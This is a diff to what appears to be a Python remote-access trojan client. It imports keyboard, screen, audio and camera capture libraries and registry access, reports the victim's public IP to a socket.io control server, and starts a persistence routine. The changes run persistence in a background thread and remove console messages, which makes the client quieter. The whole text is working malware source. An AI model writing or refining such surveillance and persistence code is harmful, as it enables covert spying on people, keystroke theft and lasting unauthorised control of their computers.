@@ -2,7 +2,7 @@
 
 import pyautogui, socketio.client, os.path, subprocess
 import socket, winreg, requests, sounddevice, soundfile
-import platform, cv2, time
+import platform, cv2, time, threading
 from pynput import keyboard
 
 server_ip = 'localhost'
@@ -265,19 +265,19 @@ info["IP"] = requests.get('https://api.ipify.org').text
 def connect():
     info['sid'] = client.sid
     client.emit('Initial_Information', info)
-    print('CLIENT SUCCESSFULLY CONNECTIED TO THE SERVER ✅')
-    try_persistence()
+    print("SUCCESS ✅: CONNECTED TO THE SERVER")
+    persistance = threading.Thread(target=try_persistence)
+    persistance.start()
 
 @client.event
 def disconnect():
-    print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
+    pass
 
 @client.on("idNumber")
 def handle_idNumber(data):
     global device_id
     device_id = data.get("idNumber")
-    print("DEVICE ID : ", device_id)
 
-print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
+print(f"CONNECTING TO THE {server_ip}:{server_port} ⏳")
 client.connect(f'http://{server_ip}:{server_port}')
 client.wait()
